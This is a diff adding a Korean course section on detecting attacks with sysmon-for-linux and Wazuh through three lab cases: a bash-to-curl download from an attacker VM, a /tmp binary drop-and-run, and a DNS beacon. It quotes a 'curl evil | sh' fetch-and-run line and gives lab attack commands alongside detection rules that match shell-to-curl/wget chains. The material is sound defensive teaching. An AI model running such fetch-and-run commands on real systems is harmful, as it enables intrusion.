@@ -715,6 +715,391 @@ echo "  sysmon: stream — 모든 ProcessCreate event (실 끝난 것 포함)"
 
 ---
 
+## 11.5 R/B/P 공격 분석 케이스 확장 (본 주차 추가)
+
+### 11.5.0 R/B/P 일상 비유 — 매장 안의 행위 카메라 + 음성 녹음 + 출입문 센서
+
+본 절은 sysmon-for-linux 의 host event stream 을 매장 안 행위 카메라 비유로 시작한다.
+
+학생이 자주 가는 편의점을 떠올려보자. 편의점에는 정문 cctv (네트워크 IDS) 와 함께 매장 안의 다음 세 가지 도구가 있다.
+
+- **행위 카메라 (Event 1 ProcessCreate)** — 누가 매장에 들어와 어떤 행동을 시작했는지 매번 한 줄로 기록.
+- **출입문 센서 (Event 3 NetworkConnect)** — 매장 안에서 외부로 통신한 모든 시도를 기록.
+- **상품 진열대 센서 (Event 11 FileCreate)** — 매장 안에 새로 들여놓은 물건 (파일) 을 기록.
+
+osquery (W07) 는 매장의 한 순간의 정지 사진 (snapshot) 이었다면, sysmon 은 매장의 행위가 실시간으로 흘러가는 영상 (stream) 이다. 한 도둑이 매장 안에서 한 행위 (`bash -c 'curl evil | sh'`) 가 발생하는 즉시 한 줄로 기록되고 SIEM 으로 흘러간다.
+
+| 일상 비유 | sysmon Event |
+|-----------|--------------|
+| 행위 카메라 | Event 1 ProcessCreate |
+| 출입문 센서 | Event 3 NetworkConnect |
+| 상품 진열대 센서 | Event 11 FileCreate |
+| 음성 키워드 (DNS) | Event 22 DnsQuery |
+| 매장의 실시간 stream | sysmon event stream → Wazuh |
+
+본 절은 다음 세 케이스를 다룬다.
+
+- 케이스 1 — bash → curl → 외부 IP 의 chain 을 Event 1 + Event 3 으로 추적.
+- 케이스 2 — `/tmp/` 의 신규 binary drop 을 Event 11 + Event 1 의 결합으로 식별.
+- 케이스 3 — DNS C2 callback 의심 패턴을 Event 22 의 DnsQuery 로 분석.
+
+원칙은 W01 ~ W10 와 같다. 재현 가능성, 도구 위주 분석, 신입생 친화, 학습 환경 한정.
+
+### 11.5.1 케이스 1 — bash → curl → 외부 IP 의 process + network chain 추적
+
+**0. 일상 비유 — 도둑이 매장 안에서 외부로 전화 거는 행위.**
+
+도둑이 매장 안에서 한 사람의 행위가 다음 두 단계로 연결된다. 1) 행위 카메라가 "어떤 사람이 휴대폰을 꺼냄" 을 기록. 2) 출입문 센서가 "그 휴대폰이 외부로 통신" 을 기록. 두 event 의 parent-child 관계가 동일 사건의 두 측면이다. 단일 event 만으로는 위협 신호가 약하지만, 두 event 의 chain 은 직접 증거가 된다.
+
+| 일상 비유 | sysmon chain |
+|-----------|--------------|
+| 휴대폰을 꺼내는 행위 | Event 1 ProcessCreate (bash → curl) |
+| 외부 통신 | Event 3 NetworkConnect |
+| 같은 사람 | 같은 ProcessGuid 또는 ParentProcessGuid |
+| chain 식별 | Wazuh rule 의 if_matched_sid + sysmon.ProcessGuid |
+
+**0a. 사용 도구 사전 안내.**
+
+- **sysmon Event 1 ProcessCreate** — 모든 process 생성 시점.
+- **sysmon Event 3 NetworkConnect** — 모든 outbound network connection.
+- **ProcessGuid** — process 의 고유 ID. 한 process 의 모든 event 가 같은 GUID 를 공유한다.
+- **Wazuh Dashboard 의 Discover.**
+
+**1. Red — 공격 재현.**
+
+attacker VM 에서 web VM 에 SSH 로 들어간 뒤 bash 안에서 외부로 통신하는 시뮬을 실행한다. 학습 환경 한정으로 실행한다.
+
+```bash
+ssh ccc@192.168.0.112
+
+ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+
+# web VM 안 (학습 환경 한정)
+bash -c 'curl -s -o /tmp/local_payload http://192.168.0.112:8080/ || true'
+```
+
+각 줄의 의미는 다음과 같다.
+
+- `bash -c '...'` — bash subshell 에서 한 줄 명령 실행.
+- `curl -s -o /tmp/local_payload http://...` — attacker VM 의 http 서버에서 임시 파일을 받는 시뮬. 외부 C2 callback 의 단순화된 형태.
+- `|| true` — 실패해도 종료 코드 0. event 발생만 보장.
+
+attacker VM 에 8080 의 simple HTTP server 가 띄워져 있다고 가정한다. 없으면 connection refused 가 나도 Event 3 자체는 발생한다.
+
+**2. 발생하는 로그/아티팩트.**
+
+web VM 의 sysmon 이 다음 두 event 를 syslog 로 보낸다.
+
+```
+Event 1 ProcessCreate:
+  Image=/usr/bin/bash, CommandLine="bash -c 'curl -s ...'"
+  ProcessGuid={...A}, ParentImage=/usr/sbin/sshd
+
+Event 1 ProcessCreate:
+  Image=/usr/bin/curl, CommandLine="curl -s -o /tmp/local_payload http://..."
+  ProcessGuid={...B}, ParentProcessGuid={...A}
+
+Event 3 NetworkConnect:
+  Image=/usr/bin/curl, ProcessGuid={...B}
+  DestinationIp=192.168.0.112, DestinationPort=8080
+```
+
+핵심은 다음 두 가지다. bash 의 ProcessGuid 가 curl 의 ParentProcessGuid 와 일치한다 (parent-child 관계). curl 의 ProcessGuid 가 Event 3 의 ProcessGuid 와 일치한다 (같은 process 의 network).
+
+같은 사건이 Wazuh 의 alerts.json 에도 통합 alert 로 다시 기록된다.
+
+**3. Blue — Wazuh Dashboard 에서 두 event chain 직접 분석.**
+
+학생이 자기 host 의 web browser 에서 Wazuh Dashboard 에 접속한다.
+
+UI 클릭 흐름은 다음과 같다.
+
+1. 좌측 햄버거 메뉴 → `Discover` 선택.
+2. Index pattern 을 `wazuh-alerts-*` 로 바꾼다.
+3. Time picker `Last 15 minutes`.
+4. Search bar 에 `agent.name:web AND rule.groups:sysmon AND data.sysmon.Image:*curl*` 입력 후 Enter.
+5. 결과 한 줄을 펼친다. `data.sysmon.ProcessGuid`, `data.sysmon.ParentImage`, `data.sysmon.CommandLine`, `data.sysmon.DestinationIp` 를 확인한다.
+
+다음으로 같은 ProcessGuid 의 다른 event 도 본다.
+
+1. Search bar 에 `data.sysmon.ProcessGuid:"{... 위에서 본 GUID ...}"` 입력.
+2. 결과로 Event 1 (ProcessCreate) 과 Event 3 (NetworkConnect) 두 줄이 보인다.
+
+ParentProcessGuid 로 bash 의 Event 1 도 찾을 수 있다.
+
+```
+Search: data.sysmon.ProcessGuid:"{...A}" OR data.sysmon.ParentProcessGuid:"{...A}"
+```
+
+세 event 의 chain (bash Event 1 → curl Event 1 → curl Event 3) 이 한 화면에 보인다.
+
+**4. Blue — 대응 의사결정.**
+
+학생이 다음 세 가지를 판단한다.
+
+- **단일 event vs chain.** 단일 Event 3 만으로는 정상 download 와 구분이 어렵다. parent 가 bash 이고 destination 이 외부 IP 이면 의심도가 크게 올라간다.
+- **destination IP 의 reputation.** 학습 환경에서는 attacker VM (192.168.0.112) 이다. 운영 환경에서는 CTI feed 의 known bad IP 와 매칭한다 (W13 학습).
+- **즉시 차단 vs 모니터링.** parent=bash + destination=외부 + binary=/usr/bin/curl 의 결합 패턴은 즉시 격리가 안전하다.
+
+**5. Purple — sysmon chain rule 작성.**
+
+다음 한 줄짜리 chain rule 을 Wazuh manager 에 추가한다.
+
+```xml
+<group name="sysmon,local,">
+  <rule id="100500" level="12">
+    <if_matched_sid>61603</if_matched_sid>
+    <field name="data.sysmon.ParentImage">/usr/bin/bash$|/bin/bash$|/bin/sh$</field>
+    <field name="data.sysmon.Image">/usr/bin/curl$|/usr/bin/wget$</field>
+    <description>LOCAL Suspicious shell to network tool chain: $(data.sysmon.CommandLine)</description>
+  </rule>
+</group>
+```
+
+(`if_matched_sid` 의 정확한 값은 학습 환경의 Wazuh 기본 sysmon rule id 에 맞게 조정.)
+
+핵심은 다음 세 가지다.
+
+- **parent + child 결합.** bash 또는 sh 에서 curl 또는 wget 으로의 chain.
+- **level 12.** 즉시 SOC 알람.
+- **CommandLine 보존.** description 에 CommandLine 을 포함해 다음 분석의 단서로 활용.
+
+본 케이스 cycle 한 바퀴는 약 25분 정도다.
+
+### 11.5.2 케이스 2 — `/tmp/` 의 신규 binary drop + 즉시 실행 chain
+
+**0. 일상 비유 — 도둑이 매장 진열대에 새 물건을 놓고 그 자리에서 사용.**
+
+도둑이 매장 안의 진열대 (`/tmp/`) 에 새 물건 (binary) 을 슬쩍 놓고, 그 즉시 자기가 가져온 물건을 작동시킨다. 진열대 센서 (Event 11 FileCreate) 가 새 물건의 등장을 즉시 기록하고, 행위 카메라 (Event 1 ProcessCreate) 가 그 물건이 작동하는 순간을 기록한다. 두 event 의 짧은 시간 간격이 핵심 단서다.
+
+| 일상 비유 | sysmon chain |
+|-----------|--------------|
+| 진열대에 새 물건 | Event 11 FileCreate at /tmp/ |
+| 그 자리 작동 | Event 1 ProcessCreate of /tmp/<binary> |
+| 짧은 시간 간격 | 두 event 의 timestamp 차이 < 1초 |
+| 의심 위치 | `/tmp/`, `/dev/shm/`, `/var/tmp/` |
+
+**0a. 사용 도구 사전 안내.**
+
+- **sysmon Event 11 FileCreate** — 새 파일 생성 시점.
+- **sysmon Event 1 ProcessCreate** — 새 process 시작 시점.
+- **Discover 의 timestamp range query.**
+
+**1. Red — 공격 재현.**
+
+attacker VM 에서 web VM 에 SSH 진입 후 `/tmp/` 에 binary 를 만들어 즉시 실행한다.
+
+```bash
+ssh ccc@192.168.0.112
+ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+
+# web VM 안 (학습 환경 한정)
+sudo cp /usr/bin/whoami /tmp/local_test_drop
+sudo chmod +x /tmp/local_test_drop
+sudo /tmp/local_test_drop
+```
+
+각 줄의 의미는 다음과 같다.
+
+- `cp /usr/bin/whoami /tmp/local_test_drop` — 정상 binary 를 의심 위치에 복사. Event 11 FileCreate 발생.
+- `chmod +x` — 실행 권한.
+- `/tmp/local_test_drop` — 의심 위치의 binary 실행. Event 1 ProcessCreate 발생.
+
+세 줄이 3초 안에 실행되면 두 event 의 짧은 시간 간격이 만들어진다.
+
+**2. 발생하는 로그/아티팩트.**
+
+```
+Event 11 FileCreate:
+  Image=/usr/bin/cp, TargetFilename=/tmp/local_test_drop
+  ProcessGuid={...X}
+
+Event 1 ProcessCreate:
+  Image=/tmp/local_test_drop, CommandLine="/tmp/local_test_drop"
+  ParentImage=/usr/bin/sudo or /usr/bin/bash
+  ProcessGuid={...Y}
+```
+
+두 event 의 timestamp 차이가 1초 이내라면 drop + 즉시 실행 패턴의 직접 증거다.
+
+**3. Blue — Discover 의 두 event 시간순 결합.**
+
+UI 클릭 흐름은 다음과 같다.
+
+1. 좌측 햄버거 메뉴 → `Discover` 선택.
+2. Index pattern `wazuh-alerts-*`.
+3. Time picker `Last 15 minutes`.
+4. Search bar 에 `agent.name:web AND rule.groups:sysmon AND (data.sysmon.TargetFilename:"/tmp/*" OR data.sysmon.Image:"/tmp/*")` 입력.
+5. 좌측 `Available fields` 에서 `data.sysmon.EventID`, `data.sysmon.Image`, `data.sysmon.TargetFilename`, `data.sysmon.CommandLine` 를 columns 에 추가.
+
+결과 화면에서 다음 두 줄이 시간순으로 보인다.
+
+```
+14:55:00  EventID=11  TargetFilename=/tmp/local_test_drop
+14:55:01  EventID=1   Image=/tmp/local_test_drop  CommandLine="/tmp/local_test_drop"
+```
+
+두 줄의 시간 차이가 1초 이내면 drop + run 패턴이다.
+
+다음으로 두 event 의 hash 비교도 본다.
+
+1. Event 11 한 줄을 펼쳐 `data.sysmon.Hashes` (SHA256) 확인.
+2. 같은 시각의 Event 1 한 줄에서도 같은 Hashes 가 보이는지 확인.
+3. 두 hash 가 일치하면 같은 binary 의 drop + run 직접 증거.
+
+**4. Blue — 대응 의사결정.**
+
+학생이 다음 세 가지를 판단한다.
+
+- **위치 의심도.** `/tmp/`, `/dev/shm/`, `/var/tmp/` 의 binary 실행은 거의 항상 의심이다.
+- **hash reputation.** binary 의 SHA256 을 VirusTotal 또는 학습 환경의 OpenCTI (W12) 와 매칭. 학습 환경에서는 known hash 와 일치하지 않으면 unknown 으로 분류.
+- **즉시 격리.** parent process 와 자식 process 모두 즉시 kill. 학습 환경에서는 자동 active-response 발동 가능.
+
+**5. Purple — `/tmp` drop+run chain rule + mount noexec.**
+
+다음 세 가지를 적용한다.
+
+- **chain rule 추가.**
+
+```xml
+<group name="sysmon,local,">
+  <rule id="100501" level="13" frequency="2" timeframe="5">
+    <if_matched_sid>61615</if_matched_sid>
+    <field name="data.sysmon.TargetFilename">^/tmp/|^/dev/shm/|^/var/tmp/</field>
+    <description>LOCAL FileCreate followed by Execute in tmp</description>
+  </rule>
+</group>
+```
+
+- **mount noexec 적용.** `/etc/fstab` 의 `/tmp` 항목에 `noexec` 옵션을 추가한다. binary 실행 자체가 OS 단에서 막힌다.
+- **scheduled hash check.** osquery 의 hash 테이블로 `/tmp/`, `/dev/shm/` 의 모든 file hash 를 매 시간 baseline 과 비교.
+
+cleanup 은 다음 한 줄이다.
+
+```bash
+sudo rm -f /tmp/local_test_drop
+```
+
+### 11.5.3 케이스 3 — DnsQuery 의 C2 callback 의심 패턴
+
+**0. 일상 비유 — 매장 안에서 외부로 메모 쪽지를 자주 보내는 사람.**
+
+도둑이 매장 안에서 외부 동료에게 메모 쪽지를 자주 보낸다. 한 쪽지는 짧고 평범한 단어 (DNS 한 줄) 라 의심하기 어렵다. 그러나 같은 사람이 같은 도메인 또는 같은 IP 로 짧은 시간에 다수 보낸다면 패턴 자체가 단서가 된다. Event 22 DnsQuery 가 매장 안에서 발생한 모든 DNS query 를 한 줄로 기록한다.
+
+| 일상 비유 | DNS C2 |
+|-----------|--------|
+| 외부로 메모 쪽지 | DNS query (도메인 조회) |
+| 짧은 평범한 단어 | 짧은 정상 도메인 |
+| 자주 같은 곳 | beacon 주기 (예: 60초 간격) |
+| 패턴 자체가 단서 | Event 22 의 burst |
+
+**0a. 사용 도구 사전 안내.**
+
+- **sysmon Event 22 DnsQuery** — process 가 발생시킨 모든 DNS query 의 한 줄 기록.
+- **`data.sysmon.QueryName`** — 조회된 도메인.
+- **`data.sysmon.Image`** — 조회를 발생시킨 process.
+
+**1. Red — 공격 재현.**
+
+attacker VM 에서 web VM 의 SSH 진입 후, 짧은 시간에 같은 도메인을 다수 조회한다. 학습 환경 한정으로 실행한다.
+
+```bash
+ssh ccc@192.168.0.112
+ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+
+# web VM 안 (학습 환경 한정)
+for i in $(seq 1 10); do
+    dig +short A "beacon.local.lab" >/dev/null 2>&1
+    sleep 6
+done
+```
+
+각 줄의 의미는 다음과 같다.
+
+- `for i in $(seq 1 10)` — 10번 반복.
+- `dig +short A "beacon.local.lab"` — 학습용 도메인의 A record 조회.
+- `sleep 6` — 6초 간격. 60초 안에 10 query 의 beacon 패턴.
+
+C2 beacon 의 단순화 시뮬이다.
+
+**2. 발생하는 로그/아티팩트.**
+
+sysmon 이 각 DNS query 를 Event 22 한 줄로 기록한다.
+
+```
+Event 22 DnsQuery:
+  Image=/usr/bin/dig, QueryName=beacon.local.lab, QueryType=A
+  ProcessGuid={...}, QueryResults=...
+```
+
+같은 QueryName 이 같은 Image 에서 짧은 시간 안에 10번 발생한다.
+
+**3. Blue — Event 22 의 burst 가시화.**
+
+UI 클릭 흐름은 다음과 같다.
+
+1. 좌측 햄버거 메뉴 → `Discover` 선택.
+2. Index pattern `wazuh-alerts-*`.
+3. Time picker `Last 15 minutes`.
+4. Search bar 에 `agent.name:web AND data.sysmon.EventID:22` 입력.
+5. 좌측 `Available fields` 에서 `data.sysmon.QueryName.keyword`, `data.sysmon.Image` 를 columns 에 추가.
+6. 우상단 `Visualize` 버튼 → Date Histogram + Split series: `data.sysmon.QueryName.keyword`.
+
+같은 QueryName 의 막대가 60초 간격으로 10번 보이는 시간 패턴이 beacon 의 직접 시그니처다.
+
+다음으로 QueryName 별 top N 도 본다.
+
+```
+Aggregation: Terms on data.sysmon.QueryName.keyword
+Top 5
+```
+
+학습 환경의 정상 도메인 (예: `juice.6v6.lab`, `dashboard.6v6.lab`) 이 아닌 도메인이 top 에 보이면 의심 신호다.
+
+**4. Blue — 대응 의사결정.**
+
+학생이 다음 세 가지를 판단한다.
+
+- **beacon 주기 식별.** 일정 간격의 query 가 보이면 C2 beacon 의 직접 시그니처.
+- **QueryName 길이 분포.** 정상 도메인은 30자 이하가 대부분. 60자 이상의 random subdomain 이 다수면 DGA (Domain Generation Algorithm) 의심.
+- **Image 의 정상 여부.** dig, host, nslookup 외에 `/tmp/...` 또는 `/dev/shm/...` 같은 비표준 위치의 binary 가 DNS query 를 발생시키면 의심도가 매우 높다.
+
+**5. Purple — DNS beacon rule.**
+
+다음 한 줄짜리 rule 을 Wazuh 에 추가한다.
+
+```xml
+<group name="sysmon,local,">
+  <rule id="100502" level="11" frequency="8" timeframe="120">
+    <if_matched_sid>61644</if_matched_sid>
+    <same_field>data.sysmon.QueryName</same_field>
+    <description>LOCAL DNS Beacon - same query 8 times in 2 minutes: $(data.sysmon.QueryName)</description>
+  </rule>
+</group>
+```
+
+(`if_matched_sid` 는 Wazuh 의 기본 sysmon Event 22 rule id 에 맞게 조정.)
+
+핵심은 다음 두 가지다.
+
+- **`same_field` data.sysmon.QueryName.** 같은 도메인의 burst 만 매칭.
+- **frequency 8 + timeframe 120.** 2분 안에 8회 이상의 burst.
+
+추가로 sysmon config 의 Event 22 onmatch 를 좁힌다. 정상 운영 도메인 (`*.6v6.lab`) 을 exclude 해 운영 noise 를 줄인다.
+
+### 11.5.4 본 절 정리
+
+본 절은 W11 의 sysmon-for-linux 학습을 실제 공격 분석 cycle 에 연결했다. 학생이 다음 능력을 갖춘다.
+
+- attacker VM 에서 bash → curl chain, /tmp drop + run, DNS beacon 의 세 가지 침해 패턴을 직접 재현한다.
+- ProcessGuid + ParentProcessGuid 의 process tree 를 Wazuh Dashboard 에서 한 query 로 추적한다.
+- Event 1 + 3 + 11 + 22 의 결합으로 단일 event 의 false positive 를 줄이고 chain 의 신뢰도를 올린다.
+- chain rule 100500 ~ 100502 와 mount noexec 등의 보완으로 운영 baseline 을 강화한다.
+
+다음 주차 W12 에서는 CTI (STIX / TAXII / OpenCTI) 의 표준과 도구를 같은 R/B/P cycle 로 학습한다.
+
+---
+
 ## 12. 한국 사례 + 표준
 
 ### 12.1 ISMS-P 2.9.6
